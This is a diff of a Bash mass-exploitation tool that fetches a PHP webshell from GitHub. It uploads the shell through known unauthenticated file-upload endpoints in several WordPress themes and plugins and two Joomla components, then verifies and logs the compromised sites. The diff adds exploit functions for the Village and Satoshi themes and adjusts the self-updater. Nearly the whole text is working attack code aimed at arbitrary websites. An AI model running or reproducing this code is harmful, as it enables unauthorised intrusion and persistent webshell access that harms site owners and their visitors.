@@ -40,10 +40,10 @@ downshell(){
 	if [[ ! -f flrnzh.php ]]; then
 		wget --quiet --no-check-certificate "https://raw.githubusercontent.com/florienzh4x/webshell/master/uploader.php" -O $shellname;
 	fi
-}
+} 
 cekupdate(){
 	version="1.0"
-	build="maklo03"
+	build="maklo04"
 	LinkUpdate="https://raw.githubusercontent.com/florienzh4x/MAKLO-NGEHEK/master/project"
 	cekupdate=$(curl -s "$LinkUpdate" -L)
 	if [[ $cekupdate == '' ]]; then
@@ -52,10 +52,10 @@ cekupdate(){
 		Vers=$(echo $cekupdate | grep -Po '(?<=version:")[^",]*')
 		BUILD=$(echo $cekupdate | grep -Po '(?<=build:")[^",]*')
 		if [[ $version != $Vers || $build != $BUILD ]]; then
-			printf "Version $Vers (Build: $BUILD) is Available. Updating Script... "
+			printf "Version $Vers (Build: $BUILD) is Avaiable. Updating Script... "
 			mv $0 $0_old; wget --quiet --no-check-certificate "https://raw.githubusercontent.com/florienzh4x/MAKLO-NGEHEK/master/MakloNgehek" -O $0; chmod +x $0; rm $0_old;
 			printf "[ OK ]\n\n"
-
+			exit;
 		fi
 	fi
 }
@@ -83,7 +83,7 @@ ${normal}${bold}
 echelon(){
 	printf "    ${cyan}Exploiting Echelon Themes ${putih}... "
 	path="/wp-content/themes/echelon/lib/admin/functions/media-upload.php"
-	echelon=$(curl -s -X POST -F "orange_themes=@${shellname}" "$wpweb/$path" -L -D -)
+	echelon=$(curl -s -X POST -F "orange_themes=@${shellname}" "$wpweb/$path" -L)
 	if [[ $echelon =~ $shellname ]]; then
 		checkshell=$(curl -s "$wpweb/wp-content/uploads/$Y/$M/$shellname" -L)
 		if [[ $checkshell =~ "Monkey B Luffy" ]]; then
@@ -100,8 +100,8 @@ echelon(){
 u-design(){
 	printf "    ${cyan}Exploiting U-Design ${putih}... "
 	path="/wp-content/themes/u-design/scripts/admin/uploadify/uploadify.php"
-	Udesign=$(curl -s -X POST -F "Filedata=@${shellname}" "$wpweb/$path" -L -D -)
-	if [[ $Udesign =~ "200 OK" ]]; then
+	Udesign=$(curl -s -X POST -F "Filedata=@${shellname}" "$wpweb/$path" -L)
+	if [[ $Udesign == 1 ]]; then
 		shellpath=$(curl -s "$wpweb/$shellname" -L)
 		if [[ $shellpath =~ "Monkey B Luffy" ]]; then
 			printf "${putih}[ ${ijo}SUCCESS ${putih}]\n"
@@ -117,7 +117,7 @@ u-design(){
 formcraft(){
 		printf "    ${cyan}Exploiting FormCraft ${putih}... "
 		path="/wp-content/plugins/formcraft/file-upload/server/php/upload.php"
-		exploit=$(curl -s -X POST -F "files[]=@${shellname}" "$wpweb/$path" -L -D -)
+		exploit=$(curl -s -X POST -F "files[]=@${shellname}" "$wpweb/$path" -L)
 		if [[ $exploit =~ "$shellname" ]]; then
 			local cek=$(echo $exploit | grep -Po '(?<=new_name":")[^"]*')
 			local cekshell=$(curl -s "$wpweb/wp-content/plugins/formcraft/file-upload/server/php/files/$shellname" -L)
@@ -137,7 +137,7 @@ themify(){
 		cekthemes=$(curl -s "$wpweb" -L)
 		if [[ $cekthemes =~ "/themify/" ]]; then
 			theme=$(echo $cekthemes | grep -Po "(?<=/themes/)[^/]*" | head -1)
-			exploit=$(curl -s "$wpweb/wp-content/themes/$theme/themify/themify-ajax.php?upload=1" -X POST -F "Filedata=@${shellname}" -L -D -)
+			exploit=$(curl -s "$wpweb/wp-content/themes/$theme/themify/themify-ajax.php?upload=1" -X POST -F "Filedata=@${shellname}" -L)
 			if [[ $exploit =~ $shellname ]]; then
 				cekshell=$(curl -s "$wpweb/wp-content/themes/$theme/uploads/$shellname" -L)
 				if [[ $cekshell =~ "Monkey B Luffy" ]]; then
@@ -155,11 +155,47 @@ themify(){
 			printf "${putih}[ ${merah}NOT VULN ${putih}]\n"
 		fi
 }
+village(){
+	printf "    ${cyan}Exploiting Village Theme ${putih}... "
+	path="$wpweb/wp-content/themes/village/blueprint/gallery/ajaxupload/server/php.php"
+	post=$(curl -s -X POST -F "qqfile=@${shellname}" "$path" -L)
+	if [[ $post =~ "success\":true" ]]; then
+		shellpath="$wpweb/wp-content/themes/village/blueprint/gallery/ajaxupload/server/uploads/$shellname"
+		checkshell=$(curl -s "$shellpath" -L)
+		if [[ $checkshell =~ "Monkey B Luffy" ]]; then
+			printf "${putih}[ ${ijo}SUCCESS ${putih}]\n"
+			echo "$jomweb/$shellname" >> Result/WordPress-shell.txt
+		else
+			printf "${putih}[ ${merah}FAILED ${putih}]\n"
+			echo "$vulnpath" >> VulnWEB/WordPress/village.txt
+		fi
+	else
+		printf "${putih}[ ${merah}NOT VULN ${putih}]\n"
+	fi
+}
+satoshi(){
+	printf "    ${cyan}Exploiting Satoshi Theme ${putih}... "
+	path="$wpweb/wp-content/themes/satoshi/upload-file.php"
+	post=$(curl -s -X POST -F "uploadfile=@${shellname}" "$path" -L)
+	if [[ $post =~ "success" ]]; then
+		shellpath="$wpweb/wp-content/themes/satoshi/images/$shellname"
+		checkshell=$(curl -s "$shellpath" -L)
+		if [[ $checkshell =~ "Monkey B Luffy" ]]; then
+			printf "${putih}[ ${ijo}SUCCESS ${putih}]\n"
+			echo "$jomweb/$shellname" >> Result/WordPress-shell.txt
+		else
+			printf "${putih}[ ${merah}FAILED ${putih}]\n"
+			echo "$vulnpath" >> VulnWEB/WordPress/satoshi.txt
+		fi
+	else
+		printf "${putih}[ ${merah}NOT VULN ${putih}]\n"
+	fi
+}
 ######################### JOOMLA EXPLOITER ##############################
 com_fabrik(){
 	printf "    ${cyan}Exploiting Com_Fabrik ${putih}... "
 	vulnpath="$jomweb/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"
-	posting=$(curl -s -X POST -F "file=@${shellname}" "$vulnpath" -L -D -)
+	posting=$(curl -s -X POST -F "file=@${shellname}" "$vulnpath" -L)
 	if [[ $posting =~ "$shellname" ]]; then
 		checkshell=$(curl -s "$jomweb/$shellname" -L)
 		if [[ $checkshell =~ "Monkey B Luffy" ]]; then
@@ -177,7 +213,7 @@ com_fabrik(){
 com_jbcatalog(){
 	printf "    ${cyan}Exploiting Com_Jbcatalog ${putih}... "
 	path="$jomweb/components/com_jbcatalog/libraries/jsupload/server/php"
-	post=$(curl -s -X POST -F "files[]=@${shellname}" "$path" -L -D -)
+	post=$(curl -s -X POST -F "files[]=@${shellname}" "$path" -L)
 	if [[ $post =~ $shellname ]]; then
 		shellpath=$(echo $post | grep -Po '(?<="url":")[^",]' | sed 's/\\\//\//g')
 		checkshell=$(curl -s "$path/files/$shellname" -L)
@@ -207,6 +243,8 @@ wordpress(){
 	u-design
 	formcraft
 	themify
+	village
+	satoshi
 }
 joomla(){
 	jomweb="$1"
@@ -217,7 +255,7 @@ joomla(){
 ########################### SCANNING ######################################
 scanning(){
 	sites="$1"
-	checking=$(curl -s --connect-timeout 10 "$sites" -L)
+	checking=$(curl -s --connect-timeout 5 "$sites" -L)
 	if [[ $checking == '' ]]; then
 		printf "${putih}[${merah}!${putih}]${kuning} $sites ${putih}[ ${cyan}No Connection${putih}/${cyan}Site Die ${putih}]\n"
 	elif [[ $checking =~ "wp-content" || $checking =~ "WordPress" || $checking =~ "wordpress" || $checking =~ "wp-includes" ]]; then
